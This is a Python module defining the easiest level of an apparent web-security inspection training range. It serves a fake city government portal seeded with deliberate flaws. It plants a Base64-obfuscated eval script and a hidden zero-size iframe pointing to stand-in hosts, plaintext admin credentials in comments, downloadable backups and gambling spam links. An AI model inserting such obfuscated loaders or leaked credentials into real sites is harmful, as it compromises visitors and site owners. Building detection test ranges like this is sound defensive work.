# -*- coding: utf-8 -*-
r"""
L1 · 公开的秘密　　难度 ★☆☆☆☆
==================================================================

【设计意图】
这一关模拟的是"完全没有安全意识"的站点：运维人员把测试环境直接扔到了公网，
备份文件没删、目录列表没关、注释没清理、后端框架版本还是五年前的。

它存在的意义是**给检测系统一个确定性的下限**：
任何工具（甚至 `curl` + `grep`）都应该能在这关拿满分。
如果一关都过不了，说明检测链路根本没接通。

【本关种入的问题】
  分类        问题                                     位置
  ──────────  ─────────────────────────────────────  ────────────────────────────
  敏感信息    身份证号 / 手机号明文                     /l1/ 首页通知公告表格
  敏感信息    管理员账号口令（明文）                    /l1/ 首页 HTML 注释
  敏感信息    数据库连接口令                            /l1/files/config.php.bak
  敏感信息    整张人员表（含身份证+手机）               /l1/files/db.sql
  敏感信息    内网 IP + OA 地址                         /l1/ 首页页脚
  敏感信息    内部工号 + 单位邮箱                       /l1/contact.html
  漏洞        目录列表开启                              /l1/files/、/l1/admin/
  漏洞        .bak / .sql 备份文件可下载                /l1/files/*
  漏洞        后台管理入口可直接访问                    /l1/admin/
  漏洞        前端组件版本过旧（jQuery 1.12.4）          /l1/js/vendor/jquery.min.js
  漏洞        robots.txt 把后台目录写了出来             /l1/robots.txt
  弱配置      十个安全响应头一个都没设                  /l1/ 全部响应
  弱配置      响应头泄漏服务器版本                      Server: Apache/2.4.29 (Ubuntu)
  挂马        eval + Base64 混淆脚本                    /l1/ 首页底部
  挂马        隐藏 iframe（width=0 height=0）           /l1/ 首页底部
  篡改        页脚被插入赌博推广外链                    /l1/ 首页页脚

【检测难度】全在明面上。不需要爬虫、不需要比对基线、不需要构造参数。
==================================================================
"""

import base64

from rangekit import FAKE, PEOPLE, box, esc, page, table

# ------------------------------------------------------------------
# 一段"混淆"的挂马代码。
# 这里用 base64 动态生成，保证解码后一定是合法的 JS（手抄容易错）。
# ------------------------------------------------------------------
_MALWARE_PLAIN = (
    'document.write(\'<iframe src="//ad-stat.example-cdn.com/p.htm" '
    'width=0 height=0 frameborder=0 style="display:none"></iframe>\');'
)
_MALWARE_B64 = base64.b64encode(_MALWARE_PLAIN.encode()).decode()


def page_index(ctx, m):
    rows = [
        ("1", "政务服务平台账号申领", "张伟明", FAKE["phone_1"], FAKE["id_card_1"], "已办结"),
        ("2", "社会保障卡信息变更", "李娜", FAKE["phone_2"], FAKE["id_card_2"], "办理中"),
        ("3", "公积金提取申请", "王建国", FAKE["phone_3"], FAKE["id_card_3"], "已办结"),
        ("4", "企业开办一网通办", "陈晓东", FAKE["phone_4"], FAKE["id_card_4"], "待受理"),
    ]
    body = f"""
<!-- ==========================================================
     运维备注（上线前记得删除本段）：
       后台管理入口 : /l1/admin/        测试账号 admin / Admin@888
       数据库        : 见 files/config.php.bak
       内网 OA       : 10.12.34.51:8080
     最后更新 2024-03-11 by 运维组
     ========================================================== -->

<h2>通知公告</h2>
<p>以下为本周政务服务事项办理情况公示：</p>
{table(["序号", "事项名称", "联系人", "联系电话", "身份证号", "状态"], rows)}

<h2>资料下载</h2>
<ul>
  <li><a href="files/download.php?f=notice.txt">通知附件下载</a></li>
  <li><a href="files/db.sql">政务服务基础数据（供内部核对）</a></li>
  <li><a href="files/config.php.bak">系统配置备份文件</a></li>
  <li><a href="files/contact-list.csv">全市政务联系人通讯录</a></li>
  <li><a href="files/README.txt">部署说明</a></li>
  <li><a href="phpinfo.php">系统环境检测</a>（运维排查用）</li>
</ul>

<h2>服务承诺</h2>
<p>本站提供在线办事、信息查询等服务。如有问题请联系信息中心：{FAKE["phone_1"]}</p>
<p>内网办公系统入口：<a href="http://10.12.34.51:8080/">{FAKE["oa_url"]}</a></p>

<script>
/* 站点统计打点 */
eval(atob('{_MALWARE_B64}'));
</script>

<div style="display:none">
<iframe src="http://www.example-tracking-cn.com/1.html" width="0" height="0" frameborder="0"></iframe>
</div>
"""
    # 页脚被篡改：插入赌博推广外链（正常站点不该出现）
    tampered_footer = (
        '<footer><div class="wrap">'
        '<p>友情链接：<a href="http://www.example-bet-cn.com/">新澳门XX娱乐</a>'
        ' | <a href="http://www.example-bet-cn.com/live">真人视讯</a>'
        ' | <a href="http://www.example-bet-cn.com/lottery">彩票投注</a></p>'
        '<p>某某市政务服务与大数据管理局 · 信息中心</p>'
        '<p class="tiny">本站为安全巡检训练靶场，页面内容与数据均为编造的测试数据。</p>'
        '</div></footer>'
    )
    html = page("某某市政务服务网", body, footer=False)
    return _reply(_finish(html, tampered_footer))


def _finish(html, footer):
    """把 page() 生成的页脚替换成指定内容。"""
    return html.replace("</body>", footer + "\n</body>")


def page_news(ctx, m):
    body = f"""
<h2>政务动态</h2>
{table(["日期", "标题"], [
    ("2024-03-11", "我市推进政务服务标准化建设"),
    ("2024-03-08", "信息中心完成机房设备巡检"),
    ("2024-03-05", "关于开展网络安全自查的通知"),
])}
<p>信息中心值班安排表（下载）：<a href="files/db.sql">db.sql</a></p>
"""
    return _reply(page("政务动态", body))


def page_notice(ctx, m):
    body = f"""
<h2>通知公告</h2>
<article>
  <h3>关于开展网络安全自查的通知</h3>
  <p>各部门：请于本月 20 日前完成自查，并将结果报送信息中心。</p>
  <p>联系人：李娜　电话：{FAKE["phone_2"]}　邮箱：{FAKE["mail_2"]}</p>
  <p>本次自查涉及的系统清单及账号由 <strong>张伟明</strong>（{FAKE["phone_1"]}）负责下发。</p>
</article>
"""
    return _reply(page("通知公告", body))


def page_contact(ctx, m):
    rows = [
        ("信息中心", "张伟明", FAKE["staff_1"], FAKE["mail_1"], FAKE["phone_1"]),
        ("政务公开科", "李娜", FAKE["staff_2"], FAKE["mail_2"], FAKE["phone_2"]),
        ("运维保障组", "陈晓东", "GW100963", FAKE["mail_3"], FAKE["phone_4"]),
    ]
    body = f"""
<h2>联系我们</h2>
{table(["科室", "负责人", "工号", "单位邮箱", "联系电话"], rows)}
<p>技术值班：10.12.34.77（内网）</p>
"""
    return _reply(page("联系我们", body))


def page_service(ctx, m):
    body = """
<h2>办事服务</h2>
<ul>
  <li><a href="#">企业开办一网通办</a></li>
  <li><a href="#">社会保障卡业务</a></li>
  <li><a href="#">公积金提取</a></li>
</ul>
<p>办事指南（PDF）：<a href="files/db.sql">点击下载</a></p>
"""
    return _reply(page("办事服务", body))


def page_admin(ctx, m):
    """后台登录页 —— 弱口令 + 表单里写死了测试账号。"""
    body = """
<div class="login">
  <h2>后台管理系统</h2>
  <form method="get" action="login.php">
    <label>用户名 <input name="user" value="admin"></label>
    <label>密码　 <input name="pass" type="text" value="Admin@888"></label>
    <button type="submit">登录</button>
  </form>
  <p class="tiny">默认账号 admin / Admin@888（生产环境请及时修改）</p>
  <p class="tiny">实际登录入口：<a href="login.php">/l1/admin/login.php</a></p>
</div>
"""
    return _reply(page("后台管理系统", body, nav_html=""))


def robots(ctx, m):
    """robots.txt 把不该公开的目录写了出来 —— 典型的"主动指路"。"""
    text = f"""User-agent: *
Disallow: /l1/admin/
Disallow: /l1/files/
Disallow: /l1/backup/
Disallow: /l1/api/

# 站点地图
Sitemap: http://{ctx.header("host")}/l1/sitemap.xml
"""
    return _reply(text, "text/plain; charset=utf-8")


def sitemap(ctx, m):
    host = ctx.header("host")
    text = f"""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>http://{host}/l1/</loc></url>
  <url><loc>http://{host}/l1/news.html</loc></url>
  <url><loc>http://{host}/l1/notice.html</loc></url>
  <url><loc>http://{host}/l1/contact.html</loc></url>
  <url><loc>http://{host}/l1/service.html</loc></url>
  <url><loc>http://{host}/l1/admin/</loc></url>
</urlset>
"""
    return _reply(text, "application/xml; charset=utf-8")


def _reply(body, ctype="text/html; charset=utf-8", status=200, headers=None, note=""):
    from serve import Reply
    return Reply(status, body, content_type=ctype, headers=headers or {}, note=note)


ROUTES = (
    ("*", r"^/$", page_index),
    ("*", r"^/index\.html$", page_index),
    ("*", r"^/news\.html$", page_news),
    ("*", r"^/notice\.html$", page_notice),
    ("*", r"^/contact\.html$", page_contact),
    ("*", r"^/service\.html$", page_service),
    ("*", r"^/admin/?$", page_admin),
    ("*", r"^/robots\.txt$", robots),
    ("*", r"^/sitemap\.xml$", sitemap),
)

LEVEL = {
    "id": 1,
    "key": "l1",
    "name": "公开的秘密",
    "difficulty": "★☆☆☆☆",
    "summary": "一点安全意识都没有的站点：备份没删、注释没清、目录没关。",
    "hints": "从首页开始，注意看源码注释、翻下载目录、看 robots.txt。",
    "tags": ["敏感信息", "挂马", "篡改", "弱配置", "漏洞"],
    "banner": "Apache/2.4.29 (Ubuntu)",     # 版本信息本身也是弱配置
    "headers": {},                          # 一个安全响应头都不设
    "autoindex": True,
    "methods": ("GET", "HEAD", "OPTIONS"),
    "assets": "l1",
    "routes": ROUTES,
}
